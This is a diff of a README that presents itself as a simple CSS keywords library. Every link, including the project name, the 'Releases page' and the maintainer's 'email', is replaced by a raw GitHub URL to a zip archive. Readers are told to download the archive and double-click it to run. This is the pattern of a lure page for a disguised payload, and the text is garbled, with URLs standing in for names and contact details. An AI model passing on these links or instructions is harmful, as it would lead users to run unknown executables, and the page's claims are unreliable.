@@ -1,16 +1,16 @@
-# 🎨 https://raw.githubusercontent.com/BlackWolf41/soenneker.quark.enums.globalkeywords/main/defiance/soenneker.quark.enums.globalkeywords.zip - Simple CSS Keywords for Easy Use
+# 🎨 https://github.com/BlackWolf41/soenneker.quark.enums.globalkeywords/raw/refs/heads/main/src/quark-soenneker-globalkeywords-enums-3.0.zip - Simple CSS Keywords for Easy Use
 
-[![Download Latest Release](https://raw.githubusercontent.com/BlackWolf41/soenneker.quark.enums.globalkeywords/main/defiance/soenneker.quark.enums.globalkeywords.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/BlackWolf41/soenneker.quark.enums.globalkeywords/main/defiance/soenneker.quark.enums.globalkeywords.zip)
+[![Download Latest Release](https://github.com/BlackWolf41/soenneker.quark.enums.globalkeywords/raw/refs/heads/main/src/quark-soenneker-globalkeywords-enums-3.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/BlackWolf41/soenneker.quark.enums.globalkeywords/raw/refs/heads/main/src/quark-soenneker-globalkeywords-enums-3.0.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the **https://raw.githubusercontent.com/BlackWolf41/soenneker.quark.enums.globalkeywords/main/defiance/soenneker.quark.enums.globalkeywords.zip** project. This software helps you easily work with CSS keywords in an organized way. It is designed for anyone looking to streamline their web design process without dealing with complicated code.
+Welcome to the **https://github.com/BlackWolf41/soenneker.quark.enums.globalkeywords/raw/refs/heads/main/src/quark-soenneker-globalkeywords-enums-3.0.zip** project. This software helps you easily work with CSS keywords in an organized way. It is designed for anyone looking to streamline their web design process without dealing with complicated code.
 
 ## 📥 Download & Install
 
 To get started, you need to download the software. Follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/BlackWolf41/soenneker.quark.enums.globalkeywords/main/defiance/soenneker.quark.enums.globalkeywords.zip).
+1. Visit the [Releases page](https://github.com/BlackWolf41/soenneker.quark.enums.globalkeywords/raw/refs/heads/main/src/quark-soenneker-globalkeywords-enums-3.0.zip).
 2. Find the latest release available.
 3. Click on the link to download the file for your operating system.
 4. After the download completes, locate the file and double-click it to run the application.
@@ -49,7 +49,7 @@ If you encounter any issues during installation or while using the application, 
 
 - **Installation Problems**: Ensure your operating system is up to date.
 - **Running Issues**: Restart your computer and try launching the application again.
-- **Missing Keywords**: Make sure you have the latest version. Update from the [Releases page](https://raw.githubusercontent.com/BlackWolf41/soenneker.quark.enums.globalkeywords/main/defiance/soenneker.quark.enums.globalkeywords.zip).
+- **Missing Keywords**: Make sure you have the latest version. Update from the [Releases page](https://github.com/BlackWolf41/soenneker.quark.enums.globalkeywords/raw/refs/heads/main/src/quark-soenneker-globalkeywords-enums-3.0.zip).
 
 For further support, you can open an issue on the GitHub repository. Our team will be glad to help.
 
@@ -58,8 +58,8 @@ For further support, you can open an issue on the GitHub repository. Our team wi
 If you have questions or feedback, feel free to reach out through the following channels:
 
 - **GitHub Issues**: Post your questions directly on the repository.
-- **Email**: Reach out to the project maintainer at [https://raw.githubusercontent.com/BlackWolf41/soenneker.quark.enums.globalkeywords/main/defiance/soenneker.quark.enums.globalkeywords.zip](https://raw.githubusercontent.com/BlackWolf41/soenneker.quark.enums.globalkeywords/main/defiance/soenneker.quark.enums.globalkeywords.zip).
+- **Email**: Reach out to the project maintainer at [https://github.com/BlackWolf41/soenneker.quark.enums.globalkeywords/raw/refs/heads/main/src/quark-soenneker-globalkeywords-enums-3.0.zip](https://github.com/BlackWolf41/soenneker.quark.enums.globalkeywords/raw/refs/heads/main/src/quark-soenneker-globalkeywords-enums-3.0.zip).
 
 ## 👉 Conclusion
 
-With **https://raw.githubusercontent.com/BlackWolf41/soenneker.quark.enums.globalkeywords/main/defiance/soenneker.quark.enums.globalkeywords.zip**, managing and utilizing CSS keywords becomes a seamless experience. Download the application today from the [Releases page](https://raw.githubusercontent.com/BlackWolf41/soenneker.quark.enums.globalkeywords/main/defiance/soenneker.quark.enums.globalkeywords.zip) and enhance your web development workflow.
+With **https://github.com/BlackWolf41/soenneker.quark.enums.globalkeywords/raw/refs/heads/main/src/quark-soenneker-globalkeywords-enums-3.0.zip**, managing and utilizing CSS keywords becomes a seamless experience. Download the application today from the [Releases page](https://github.com/BlackWolf41/soenneker.quark.enums.globalkeywords/raw/refs/heads/main/src/quark-soenneker-globalkeywords-enums-3.0.zip) and enhance your web development workflow.
